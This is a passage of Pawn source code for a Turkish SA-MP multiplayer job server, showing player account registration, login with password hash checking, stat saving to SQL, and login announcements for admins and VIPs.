				LoadSakliKasaInfoFromString(playerid, ParameterValue);
			if (strcmp(ParameterName, "VIP", false) == 0) // If the parametername is correct ("Rutbe")
				format(VIPBitis[playerid], 20, ParameterValue);
			if (strcmp(ParameterName, "Rank", false) == 0) // If the parametername is correct ("Rutbe")
				Rank[playerid] = strval(ParameterValue);
			if (strcmp(ParameterName, "MeslekY", false) == 0) // If the parametername is correct ("Rutbe")
				MeslekdeYaparmis[playerid] = strval(ParameterValue);

			new EvoturK[80], EvoreyiZ[4][10];

			if (strcmp(ParameterName, "OnlineS", false) == 0) // If the parametername is correct ("Rutbe")
				format(EvoturK, 80, ParameterValue);
			split(EvoturK, EvoreyiZ, '|');
			pInfo[playerid][pOGun] = strval(EvoreyiZ[0]);
			pInfo[playerid][pOSaat] = strval(EvoreyiZ[1]);
			pInfo[playerid][pODakika] = strval(EvoreyiZ[2]);
			pInfo[playerid][pOSaniye] = strval(EvoreyiZ[3]);

			fread(PFile, LineFromFile); // Read the next line of the file
		}

		fclose(PFile);
		fremove(file);

		format(file, sizeof(file), BankFile, GetName(playerid));
		if(fexist(file))
		{
		    BankFile_Load(playerid);
		}

		Oyuncu_YeniKayit(playerid);
		return 1;
	}
	else
	    return 0;
}

// Oyuncu_YeniKayit
Oyuncu_YeniKayit(playerid)
{
	new day, month, year;
	getdate(year, month, day);

	pInfo[playerid][pKGun] = day;
	pInfo[playerid][pKAy] = month;
	pInfo[playerid][pKYil] = year;
	pInfo[playerid][pSGun] = day;
	pInfo[playerid][pSAy] = month;
	pInfo[playerid][pSYil] = year;

 	new handle = SQL::Open(SQL::INSERT, "oyuncular");
  	SQL::ToggleAutoIncrement(handle, true);
    SQL::WriteString(handle, "Nick", APlayerData[playerid][PlayerName]);

    SQL::WriteString(handle, "Sifre", APlayerData[playerid][PlayerPassword]);
    SQL::WriteString(handle, "AdmSifre", "SIFREYOK");

	SQL::WriteInt(handle, "AdminLevel", 0);
 	SQL::WriteInt(handle, "DJLevel", APlayerData[playerid][PlayerDjLevel]);
 	SQL::WriteInt(handle, "RehberLevel", APlayerData[playerid][PlayerRehberLevel]);
	SQL::WriteInt(handle, "DonLevel", APlayerData[playerid][PlayerDonLevel]);

 	SQL::WriteInt(handle, "Jailed", APlayerData[playerid][PlayerJailed]);
  	SQL::WriteInt(handle, "Wanted", APlayerData[playerid][PlayerWanted]);

  	SQL::WriteInt(handle, "TruckerLicense", APlayerData[playerid][TruckerLicense]);
  	SQL::WriteInt(handle, "BusLicense", APlayerData[playerid][BusLicense]);
  	SQL::WriteInt(handle, "DolmusLicense", APlayerData[playerid][DolmusLicense]);
  	SQL::WriteInt(handle, "PilotLicense", APlayerData[playerid][PilotLicense]);
  	SQL::WriteInt(handle, "GemiciLicense", APlayerData[playerid][GemiciLicense]);
  	SQL::WriteInt(handle, "MafiaLicense", APlayerData[playerid][MafiaLicense]);

    SQL::WriteInt(handle, "Muted", APlayerData[playerid][Muted]);

	if(APlayerData[playerid][RulesRead] == true)
	{
    	SQL::WriteString(handle, "RulesRead", "Yes");
	}else{
    	SQL::WriteString(handle, "RulesRead", "No");
	}

    SQL::WriteFloat(handle, "StatsMetersDriven", APlayerData[playerid][StatsMetersDriven]);
  	SQL::WriteInt(handle, "StatsTruckerJobs", APlayerData[playerid][StatsTruckerJobs]);
  	SQL::WriteInt(handle, "StatsConvoyJobs", APlayerData[playerid][StatsConvoyJobs]);
  	SQL::WriteInt(handle, "StatsBusDriverJobs", APlayerData[playerid][StatsBusDriverJobs]);
  	SQL::WriteInt(handle, "StatsDolmusDriverJobs", APlayerData[playerid][StatsDolmusDriverJobs]);
  	SQL::WriteInt(handle, "StatsPilotJobs", APlayerData[playerid][StatsPilotJobs]);
  	SQL::WriteInt(handle, "StatsMafiaJobs", APlayerData[playerid][StatsMafiaJobs]);
  	SQL::WriteInt(handle, "StatsMafiaStolen", APlayerData[playerid][StatsMafiaStolen]);
  	SQL::WriteInt(handle, "StatsPoliceFined", APlayerData[playerid][StatsPoliceFined]);
  	SQL::WriteInt(handle, "StatsPoliceJailed", APlayerData[playerid][StatsPoliceJailed]);
  	SQL::WriteInt(handle, "StatsFBYFined", APlayerData[playerid][StatsFBYFined]);
  	SQL::WriteInt(handle, "StatsFBYJailed", APlayerData[playerid][StatsFBYJailed]);
  	SQL::WriteInt(handle, "StatsRoadworkerJobs", APlayerData[playerid][StatsRoadworkerJobs]);
  	SQL::WriteInt(handle, "StatsGemiciJobs", APlayerData[playerid][StatsGemiciJobs]);
  	SQL::WriteInt(handle, "StatsGJobs", APlayerData[playerid][StatsCopcuJobs]);
  	SQL::WriteInt(handle, "StatsBankaJobs", APlayerData[playerid][StatsBankaJobs]);
  	SQL::WriteInt(handle, "StatsFireJobs", APlayerData[playerid][StatsFireJobs]);
  	SQL::WriteInt(handle, "StatsOduncuJobs", APlayerData[playerid][StatsOduncuJobs]);
  	SQL::WriteInt(handle, "StatsBalikciJobs", APlayerData[playerid][StatsBalikciJobs]);
    SQL::WriteInt(handle, "StatsPboyJobs", APlayerData[playerid][StatsPboyJobs]);
    SQL::WriteInt(handle, "StatsKargocuJobs", APlayerData[playerid][StatsKargocuJobs]);

  	SQL::WriteInt(handle, "Money", APlayerData[playerid][PlayerMoney]);
  	SQL::WriteInt(handle, "Score", APlayerData[playerid][PlayerScore]);

  	SQL::WriteInt(handle, "Sirket", Sirket[playerid]);
  	SQL::WriteInt(handle, "SirketRutbe", SirketRutbe[playerid]);
  	SQL::WriteInt(handle, "SirketKatki", SirketKatki[playerid]);
  	SQL::WriteInt(handle, "GizliKasa", SakliKasaTamam[playerid]);
    SQL::WriteString(handle, "GizliKasaI", SaveSakliKasaInfoToString(playerid));
    SQL::WriteString(handle, "VIP", VIPBitis[playerid]);

  	SQL::WriteInt(handle, "Rank", Rank[playerid]);
  	SQL::WriteInt(handle, "MeslekY", MeslekdeYaparmis[playerid]);

    SQL::WriteInt(handle, "KayitGun", pInfo[playerid][pKGun]);
    SQL::WriteInt(handle, "KayitAy", pInfo[playerid][pKAy]);
    SQL::WriteInt(handle, "KayitYil", pInfo[playerid][pKYil]);
    SQL::WriteInt(handle, "SonGun", pInfo[playerid][pSGun]);
    SQL::WriteInt(handle, "SonAy", pInfo[playerid][pSAy]);
    SQL::WriteInt(handle, "SonYil", pInfo[playerid][pSYil]);
    SQL::WriteInt(handle, "OSaniye", pInfo[playerid][pOSaniye]);
    SQL::WriteInt(handle, "ODakika", pInfo[playerid][pODakika]);
    SQL::WriteInt(handle, "OSaat", pInfo[playerid][pOSaat]);
    SQL::WriteInt(handle, "OGun", pInfo[playerid][pOGun]);

    SQL::WriteInt(handle, "OnlineStatus", 0);
    SQL::WriteInt(handle, "EP", 0);
    SQL::WriteInt(handle, "Skin", -1);

    SQL::WriteInt(handle, "EXP", EXP[playerid]);
    SQL::WriteInt(handle, "Level", Level[playerid]);
    
    SQL::WriteString(handle, "playerMail", "");

    APlayerData[playerid][PlayerSQLID] = SQL::Close(handle);
	format(APlayerData[playerid][playerMail], 128, "");

    APlayerData[playerid][LoggedIn] = true;
    return 1;
}

// Oyuncu_Yukle
Oyuncu_Yukle(playerid, sifre[])
{
	new hash[256], Yazi[500];
 	SHA256_PassHash(sifre, "", hash, 256);
	if(!strcmp(hash, APlayerData[playerid][PlayerPassword]))
    {
   		new handle = SQL::Open(SQL::READ, "oyuncular", "ID", APlayerData[playerid][PlayerSQLID]);
    	SQL::ReadString(handle, "AdmSifre", APlayerData[playerid][PlayerAdmPassword], 300);

		SQL::ReadInt(handle, "AdminLevel", APlayerData[playerid][PlayerFLevel]);
 		SQL::ReadInt(handle, "DJLevel", APlayerData[playerid][PlayerDjLevel]);
 		SQL::ReadInt(handle, "RehberLevel", APlayerData[playerid][PlayerRehberLevel]);
		SQL::ReadInt(handle, "DonLevel", APlayerData[playerid][PlayerDonLevel]);

 		SQL::ReadInt(handle, "Jailed", APlayerData[playerid][PlayerJailed]);
  		SQL::ReadInt(handle, "Wanted", APlayerData[playerid][PlayerWanted]);

  		SQL::ReadInt(handle, "TruckerLicense", APlayerData[playerid][TruckerLicense]);
  		SQL::ReadInt(handle, "BusLicense", APlayerData[playerid][BusLicense]);
  		SQL::ReadInt(handle, "DolmusLicense", APlayerData[playerid][DolmusLicense]);
  		SQL::ReadInt(handle, "PilotLicense", APlayerData[playerid][PilotLicense]);
  		SQL::ReadInt(handle, "GemiciLicense", APlayerData[playerid][GemiciLicense]);
  		SQL::ReadInt(handle, "MafiaLicense", APlayerData[playerid][MafiaLicense]);

        SQL::ReadInt(handle, "Muted", APlayerData[playerid][Muted]);

        SQL::ReadString(handle, "RulesRead", Yazi, 500);
		if(!strcmp(Yazi, "Yes", true))
		{
    		APlayerData[playerid][RulesRead] = true;
		}else{
    		APlayerData[playerid][RulesRead] = false;
		}

    	SQL::ReadFloat(handle, "StatsMetersDriven", APlayerData[playerid][StatsMetersDriven]);
  		SQL::ReadInt(handle, "StatsTruckerJobs", APlayerData[playerid][StatsTruckerJobs]);
  		SQL::ReadInt(handle, "StatsConvoyJobs", APlayerData[playerid][StatsConvoyJobs]);
  		SQL::ReadInt(handle, "StatsBusDriverJobs", APlayerData[playerid][StatsBusDriverJobs]);
  		SQL::ReadInt(handle, "StatsDolmusDriverJobs", APlayerData[playerid][StatsDolmusDriverJobs]);
  		SQL::ReadInt(handle, "StatsPilotJobs", APlayerData[playerid][StatsPilotJobs]);
  		SQL::ReadInt(handle, "StatsMafiaJobs", APlayerData[playerid][StatsMafiaJobs]);
  		SQL::ReadInt(handle, "StatsMafiaStolen", APlayerData[playerid][StatsMafiaStolen]);
  		SQL::ReadInt(handle, "StatsPoliceFined", APlayerData[playerid][StatsPoliceFined]);
  		SQL::ReadInt(handle, "StatsPoliceJailed", APlayerData[playerid][StatsPoliceJailed]);
  		SQL::ReadInt(handle, "StatsFBYFined", APlayerData[playerid][StatsFBYFined]);
  		SQL::ReadInt(handle, "StatsFBYJailed", APlayerData[playerid][StatsFBYJailed]);
  		SQL::ReadInt(handle, "StatsRoadworkerJobs", APlayerData[playerid][StatsRoadworkerJobs]);
  		SQL::ReadInt(handle, "StatsGemiciJobs", APlayerData[playerid][StatsGemiciJobs]);
  		SQL::ReadInt(handle, "StatsGJobs", APlayerData[playerid][StatsCopcuJobs]);
  		SQL::ReadInt(handle, "StatsBankaJobs", APlayerData[playerid][StatsBankaJobs]);
  		SQL::ReadInt(handle, "StatsFireJobs", APlayerData[playerid][StatsFireJobs]);
  		SQL::ReadInt(handle, "StatsOduncuJobs", APlayerData[playerid][StatsOduncuJobs]);
  		SQL::ReadInt(handle, "StatsBalikciJobs", APlayerData[playerid][StatsBalikciJobs]);
        SQL::ReadInt(handle, "StatsPboyJobs", APlayerData[playerid][StatsPboyJobs]);
        SQL::ReadInt(handle, "StatsKargocuJobs", APlayerData[playerid][StatsKargocuJobs]);

  		SQL::ReadInt(handle, "Money", APlayerData[playerid][PlayerMoney]);
  		SQL::ReadInt(handle, "Score", APlayerData[playerid][PlayerScore]);

  		SQL::ReadInt(handle, "Sirket", Sirket[playerid]);
  		SQL::ReadInt(handle, "SirketRutbe", SirketRutbe[playerid]);
  		SQL::ReadInt(handle, "SirketKatki", SirketKatki[playerid]);
  		SQL::ReadInt(handle, "GizliKasa", SakliKasaTamam[playerid]);
    	SQL::ReadString(handle, "GizliKasaI", Yazi, 500);
    	LoadSakliKasaInfoFromString(playerid, Yazi);
    	SQL::ReadString(handle, "VIP", VIPBitis[playerid], 20);
  		SQL::ReadInt(handle, "Rank", Rank[playerid]);
  		SQL::ReadInt(handle, "MeslekY", MeslekdeYaparmis[playerid]);

   	 	SQL::ReadInt(handle, "KayitGun", pInfo[playerid][pKGun]);
    	SQL::ReadInt(handle, "KayitAy", pInfo[playerid][pKAy]);
    	SQL::ReadInt(handle, "KayitYil", pInfo[playerid][pKYil]);
    	SQL::ReadInt(handle, "SonGun", pInfo[playerid][pSGun]);
    	SQL::ReadInt(handle, "SonAy", pInfo[playerid][pSAy]);
    	SQL::ReadInt(handle, "SonYil", pInfo[playerid][pSYil]);
    	SQL::ReadInt(handle, "OSaniye", pInfo[playerid][pOSaniye]);
    	SQL::ReadInt(handle, "ODakika", pInfo[playerid][pODakika]);
    	SQL::ReadInt(handle, "OSaat", pInfo[playerid][pOSaat]);
    	SQL::ReadInt(handle, "OGun", pInfo[playerid][pOGun]);

    	SQL::ReadInt(handle, "Skin", pSkin[playerid]);
    	SQL::ReadInt(handle, "EXP", EXP[playerid]);
    	SQL::ReadInt(handle, "Level", Level[playerid]);
    	
    	SQL::ReadString(handle, "playerMail", APlayerData[playerid][playerMail], 500);
    	

   		SQL::Close(handle);

   		APlayerData[playerid][LoggedIn] = true;

		// 60 Saniye Giriþ Süre
		KillTimer(girisSure[playerid]);
		girisSure[playerid] = -1;

		// VIP Sistemi
		VIPControl(playerid);
		if(VIP[playerid] == 1)
		{
			new year, month, day, hour, VBParca[4][10];
			split(VIPBitis[playerid], VBParca, '.');
			day = strval(VBParca[0]);
			month = strval(VBParca[1]);
			year = strval(VBParca[2]);
			hour = strval(VBParca[3]);
			format(Yazi, 500, "{FFCC00}» {FFFFFF}VIP üyeliðiniz devam etmektedir. Bitiþ Tarihi: {FFCC00}%d.%d.%d Saat %d.00", day, month, year, hour);
			SendClientMessage(playerid, -1, Yazi);
		}

		// Yýlbaþý VIP Sistemi
		new gun, ay, yil;
		getdate(yil, ay, gun);
		//if(gun == 30 && ay == 12) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yýlbaþý Etkinlikleri sebebiyle herkes VIP");
		//if(gun == 31 && ay == 12) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yýlbaþý Etkinlikleri sebebiyle herkes VIP");
		//if(gun == 1 && ay == 1) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yýlbaþý Etkinlikleri sebebiyle herkes VIP");

		//if(gun == 31 && ay == 8) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Kurban bayramý boyunca herkes VIP");
		//if(gun == 1 && ay == 9) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Kurban bayramý boyunca herkes VIP");
		//if(gun == 2 && ay == 9) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Kurban bayramý boyunca herkes VIP");
		//if(gun == 3 && ay == 9) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Kurban bayramý boyunca herkes VIP");
		//if(gun == 20 && ay == 8) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}V5 Dolayýsýyla 18,19 ve 20 Aðustos'da herkes VIP.");

		// 23 Nisan VIP Sistemi
		if(gun == 23 && ay == 4) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}23 Nisan Ulusal Egemenlik ve Çocuk Bayramý nedeniyle bugün herkes VIP'dir.");
		if(gun == 2 && ay == 5) YVIP[playerid] = 1, SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}1 Mayýs Ýþçi ve Emekçiler Bayramý nedeniyle bugün herkes VIP'dir.");

		// Þirket Sistemi
		if(Sirket[playerid] != -1)
		{
			if(Sirketler[ Sirket[playerid] ][SirketBorc])
			{
  				SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Þirketiniz 7 gün içinde deðeri kadar para toplayamadý.");
	    		SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}3 gün içinde bu parayý toplayamazsanýz þirketiniz kapanacaktýr.");
			}
		}

		// Donator Sistemi

        if(!strcmp("NicqsiZAcent", GetName(playerid), true))
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}SUNUCU SAHIBI{FF0000} NicqsiZAcent(%d) {F8F8FF}sunucuya giriþ yaptý.", playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else
		if(!strcmp("TeaMStar", GetName(playerid), true))
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}SUNUCU SAHIBI{FF0000} TeaMStar(%d) {F8F8FF}sunucuya giriþ yaptý.", playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else
		if(!strcmp("Tiger", GetName(playerid), true))
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}SUNUCU SAHIBI{FF0000} Tiger(%d) {F8F8FF}sunucuya giriþ yaptý.", playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else
		if(!strcmp("MaWixXx", GetName(playerid), true))
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}SUNUCU SAHIBI{FF0000} MaWixXx(%d) {F8F8FF}sunucuya giriþ yaptý.", playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else

		if(APlayerData[playerid][PlayerFLevel] == 7)
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}ÜST DÜZEY YÖNETÝCÝ{FF0000} %s(%d) {F8F8FF}sunucuya giriþ yaptý.", GetName(playerid), playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else

		if(APlayerData[playerid][PlayerFLevel] >= 1)
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}ADMIN{FF0000} %s(%d) {F8F8FF}sunucuya giriþ yaptý.", GetName(playerid), playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		}else
			if(APlayerData[playerid][PlayerRehberLevel] == 1)
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{F8F8FF}REHBER{FF0000} %s(%d) {F8F8FF}sunucuya giriþ yaptý.", GetName(playerid), playerid);
	    	SendClientMessageToAll(-1, Yazi);   
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		}else
		if(APlayerData[playerid][PlayerDjLevel] == 7)
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{FF0000}DJ ,{FF0000} %s(%d) {F8F8FF}sunucuya giriþ yaptý.", GetName(playerid), playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		} else
		if(APlayerData[playerid][PlayerDonLevel] > 0)
		{
	    	SendClientMessageToAll(-1, "{F8F8FF}");
	    	format(Yazi, 256, "{FF4040}DONATOR %s(%d) {F8F8FF}sunucuya giriþ yaptý.", GetName(playerid), playerid);
	    	SendClientMessageToAll(-1, Yazi);
	    	SendClientMessageToAll(-1, "{F8F8FF}");
		}else
		if(APlayerData[playerid][PlayerFLevel] == 0)
		{
	    	format(Yazi, 256, "~r~~h~~w~Oyuncu ~r~~h~%s(%d) ~w~sunucuya gIrIs yaptI", GetName(playerid), playerid);
	    	SendDuyuruText(Yazi);
		}

		/*if(!strcmp("-", CalanMP3URL, true))
		{
		}else{
			PlayAudioStreamForPlayer(playerid, CalanMP3URL);
		}*/
		SendClientMessage(playerid, -1, "{FFCC00}» {FFCC00}DJ'{FFFFFF}lerin açtýðý müzikleri dinlemek istiyorsanýz {FFCC00}/sac {FFFFFF}yazabilirsiniz.");


	    // Araç Sahiplik Sistemi
	    AKUI_Load(playerid);
		Galeride[playerid] = false;

		foreach(new AracID:ASHPs)
		{
		    new pName[254];
		    GetPlayerName(playerid, pName, sizeof(pName));
		    if(!strcmp(AracSHP[AracID][ASHPSahip], pName, true))
		    {
				AracSHP[AracID][ASHPVehID] = Add_DynamicVehicle(AracSHP[AracID][ASHPModel], AracSHP[AracID][ASHPX], AracSHP[AracID][ASHPY], AracSHP[AracID][ASHPZ], AracSHP[AracID][ASHPRot], AracSHP[AracID][ASHPRenk1], AracSHP[AracID][ASHPRenk2], -1);
				Araclar[ AracSHP[AracID][ASHPVehID] ][AracInSHP] = true;
				Araclar[ AracSHP[AracID][ASHPVehID] ][AracSHPID] = AracID;
				SetVehicleNumberPlate(AracSHP[AracID][ASHPVehID], AracSHP[AracID][ASHPPlaka]);
				SetVehicleToRespawn(AracSHP[AracID][ASHPVehID]);

				Arac_LoadMod(AracID);

				if(AracSHP[AracID][ASHPKaravan] == 1)
				{
					Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravan] = true;
				 	Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravanObj] = CreateDynamicObjectEx(3171, 0, 0, 0, 0, 0, 0, 100.0);
				  	AttachDynamicObjectToVehicle(Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravanObj], AracSHP[AracID][ASHPVehID], 0.084999, -2.125115, -1.144999, -3.014999, 0.000000, 178.890090);

					new KarYazi[500];
					format(KarYazi, 500, "{80FFFF}KARAVAN\n \n{DDDDDD}Sahip {FFC000}%s\n{DDDDDD}Ýçeri girmek için {ADFF2F}/karavan\n{DDDDDD}Aracýnýza takmak için {ADFF2F}Y Tuþu", AracSHP[AracID][ASHPSahip]);
					Araclar[ AracSHP[AracID][ASHPVehID] ][AracKaravan3D] = CreateDynamic3DTextLabelEx(KarYazi, -1, 0, 0, 0, 100.0, INVALID_PLAYER_ID, AracSHP[AracID][ASHPVehID]);
				}
		    }
		}
	
		// SpeedoMeter Sistemi [ Yeni Speedo ]
 		LoadPlayerSpeedo(playerid);

        House_PlayerInit(playerid);

        // MeslekUI
		SpawnPlayer(playerid);
		SetPlayerInterior(playerid,17);
		SetPlayerPos(playerid,486.390991, -12.722799, 990.679687);
		SetPlayerFacingAngle(playerid, 100.0);
		SetPlayerCameraPos(playerid, -1518.43, -2824.49,   74.02);
		SetPlayerCameraLookAt(playerid, -1559.75, -2734.69,   48.55);
		TogglePlayerControllable(playerid, 0);

		APlayerSpawnData[playerid] = false;

		MeslekUI_Mod[playerid] = 1;
		MeslekUI_Show(playerid);
		
		SetPlayerCameraPos(playerid, -1518.43, -2824.49,   74.02);
		SetPlayerCameraLookAt(playerid, -1559.75, -2734.69,   48.55);

		Oyuncu_Kaydet(playerid);
   	}else{
		pInfo[playerid][pSifreHak]++;

		if(pInfo[playerid][pSifreHak] == MaxYanlisSifreHak)
		{
		    ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{FF4040}Oyuncu Hesap Güvenliði", "{DDDDDD}Hesap þifresini {FF4040}3 kez {DDDDDD}yanlýþ girdiðiniz için sunucudan atýldýnýz.", "Kapat", "");
			SafeKick(playerid);
		}else{
			format(Yazi, 500, "%s{DDDDDD}Þifrenizi {FF4040}%d kez {DDDDDD}yanlýþ girdiniz.\n", Yazi, pInfo[playerid][pSifreHak]);
			format(Yazi, 500, "%s{DDDDDD}Doðru þifre girmek için {ADFF2F}%d hakkýnýz {DDDDDD}kaldý.\n", Yazi, MaxYanlisSifreHak - pInfo[playerid][pSifreHak]);

        	ShowPlayerDialog(playerid, DialogLogin, DIALOG_STYLE_PASSWORD, "{FFCC00}» {FFFFFF}Canakkale Meslek Sunucusu - Giriþ", Yazi, "Giriþ", "Çýk");
		}
	}
}

// Oyuncu_Kaydet
Oyuncu_Kaydet(playerid, bool:Cikiyor = false)
{
	new day, month, year;
	getdate(year, month, day);

	pInfo[playerid][pSGun] = day;
	pInfo[playerid][pSAy] = month;
	pInfo[playerid][pSYil] = year;

	new handle = SQL::Open(SQL::UPDATE, "oyuncular", "ID", APlayerData[playerid][PlayerSQLID]);
    SQL::WriteString(handle, "Nick", APlayerData[playerid][PlayerName]);

    SQL::WriteString(handle, "Sifre", APlayerData[playerid][PlayerPassword]);
    SQL::WriteString(handle, "AdmSifre", APlayerData[playerid][PlayerAdmPassword]);

	SQL::WriteInt(handle, "AdminLevel", APlayerData[playerid][PlayerFLevel]);
 	SQL::WriteInt(handle, "DJLevel", APlayerData[playerid][PlayerDjLevel]);
 	SQL::WriteInt(handle, "RehberLevel", APlayerData[playerid][PlayerRehberLevel]);
	SQL::WriteInt(handle, "DonLevel", APlayerData[playerid][PlayerDonLevel]);

 	SQL::WriteInt(handle, "Jailed", APlayerData[playerid][PlayerJailed]);
  	SQL::WriteInt(handle, "Wanted", APlayerData[playerid][PlayerWanted]);

  	SQL::WriteInt(handle, "TruckerLicense", APlayerData[playerid][TruckerLicense]);
  	SQL::WriteInt(handle, "BusLicense", APlayerData[playerid][BusLicense]);
  	SQL::WriteInt(handle, "DolmusLicense", APlayerData[playerid][DolmusLicense]);
  	SQL::WriteInt(handle, "PilotLicense", APlayerData[playerid][PilotLicense]);
  	SQL::WriteInt(handle, "GemiciLicense", APlayerData[playerid][GemiciLicense]);
  	SQL::WriteInt(handle, "MafiaLicense", APlayerData[playerid][MafiaLicense]);

    SQL::WriteInt(handle, "Muted", APlayerData[playerid][Muted]);

	if(APlayerData[playerid][RulesRead] == true)
	{
    	SQL::WriteString(handle, "RulesRead", "Yes");
	}else{
    	SQL::WriteString(handle, "RulesRead", "No");
	}

    SQL::WriteFloat(handle, "StatsMetersDriven", APlayerData[playerid][StatsMetersDriven]);
  	SQL::WriteInt(handle, "StatsTruckerJobs", APlayerData[playerid][StatsTruckerJobs]);
  	SQL::WriteInt(handle, "StatsConvoyJobs", APlayerData[playerid][StatsConvoyJobs]);
  	SQL::WriteInt(handle, "StatsBusDriverJobs", APlayerData[playerid][StatsBusDriverJobs]);
  	SQL::WriteInt(handle, "StatsDolmusDriverJobs", APlayerData[playerid][StatsDolmusDriverJobs]);
  	SQL::WriteInt(handle, "StatsPilotJobs", APlayerData[playerid][StatsPilotJobs]);
  	SQL::WriteInt(handle, "StatsMafiaJobs", APlayerData[playerid][StatsMafiaJobs]);
  	SQL::WriteInt(handle, "StatsMafiaStolen", APlayerData[playerid][StatsMafiaStolen]);
  	SQL::WriteInt(handle, "StatsPoliceFined", APlayerData[playerid][StatsPoliceFined]);
  	SQL::WriteInt(handle, "StatsPoliceJailed", APlayerData[playerid][StatsPoliceJailed]);
  	SQL::WriteInt(handle, "StatsFBYFined", APlayerData[playerid][StatsFBYFined]);
  	SQL::WriteInt(handle, "StatsFBYJailed", APlayerData[playerid][StatsFBYJailed]);
  	SQL::WriteInt(handle, "StatsRoadworkerJobs", APlayerData[playerid][StatsRoadworkerJobs]);
  	SQL::WriteInt(handle, "StatsGemiciJobs", APlayerData[playerid][StatsGemiciJobs]);
  	SQL::WriteInt(handle, "StatsGJobs", APlayerData[playerid][StatsCopcuJobs]);
  	SQL::WriteInt(handle, "StatsBankaJobs", APlayerData[playerid][StatsBankaJobs]);
  	SQL::WriteInt(handle, "StatsFireJobs", APlayerData[playerid][StatsFireJobs]);
  	SQL::WriteInt(handle, "StatsOduncuJobs", APlayerData[playerid][StatsOduncuJobs]);
  	SQL::WriteInt(handle, "StatsBalikciJobs", APlayerData[playerid][StatsBalikciJobs]);
    SQL::WriteInt(handle, "StatsPboyJobs", APlayerData[playerid][StatsPboyJobs]);
    SQL::WriteInt(handle, "StatsKargocuJobs", APlayerData[playerid][StatsKargocuJobs]);

  	SQL::WriteInt(handle, "Money", APlayerData[playerid][PlayerMoney]);
  	SQL::WriteInt(handle, "Score", APlayerData[playerid][PlayerScore]);

  	SQL::WriteInt(handle, "Sirket", Sirket[playerid]);
  	SQL::WriteInt(handle, "SirketRutbe", SirketRutbe[playerid]);
  	SQL::WriteInt(handle, "SirketKatki", SirketKatki[playerid]);
  	SQL::WriteInt(handle, "GizliKasa", SakliKasaTamam[playerid]);
    SQL::WriteString(handle, "GizliKasaI", SaveSakliKasaInfoToString(playerid));
    SQL::WriteString(handle, "VIP", VIPBitis[playerid]);

  	SQL::WriteInt(handle, "Rank", Rank[playerid]);
  	SQL::WriteInt(handle, "MeslekY", MeslekdeYaparmis[playerid]);

    SQL::WriteInt(handle, "KayitGun", pInfo[playerid][pKGun]);
    SQL::WriteInt(handle, "KayitAy", pInfo[playerid][pKAy]);
    SQL::WriteInt(handle, "KayitYil", pInfo[playerid][pKYil]);
    SQL::WriteInt(handle, "SonGun", pInfo[playerid][pSGun]);
    SQL::WriteInt(handle, "SonAy", pInfo[playerid][pSAy]);
    SQL::WriteInt(handle, "SonYil", pInfo[playerid][pSYil]);
    SQL::WriteInt(handle, "OSaniye", pInfo[playerid][pOSaniye]);
    SQL::WriteInt(handle, "ODakika", pInfo[playerid][pODakika]);
    SQL::WriteInt(handle, "OSaat", pInfo[playerid][pOSaat]);
    SQL::WriteInt(handle, "OGun", pInfo[playerid][pOGun]);

	if(Cikiyor == false)
	{
		SQL::WriteInt(handle, "OnlineStatus", 1);
	}else{
	    SQL::WriteInt(handle, "OnlineStatus", 0);
	}

	SQL::WriteInt(handle, "Skin", pSkin[playerid]);

	SQL::WriteInt(handle, "EXP", EXP[playerid]);
	SQL::WriteInt(handle, "Level", Level[playerid]);
	
	SQL::WriteString(handle, "playerMail", APlayerData[playerid][playerMail]);
	
	

    SQL::Close(handle);
}
/*
vipver(playerid)
{
    if(APlayerData[playerid][verilecekvip] != 0)
	    	{
	    		if(VIP[playerid] == 0)
	    		{
				new vipgun = APlayerData[playerid][verilecekvip];
	    	    new tmp[128];
	    	    new year, month, day, hour, minute, second, VIPBitT[20];
				getdate(year, month, day);
				gettime(hour, minute, second);
				#pragma unused minute
				#pragma unused second
				format(VIPBitT, 20, GunEkle(vipgun, day, month, year));
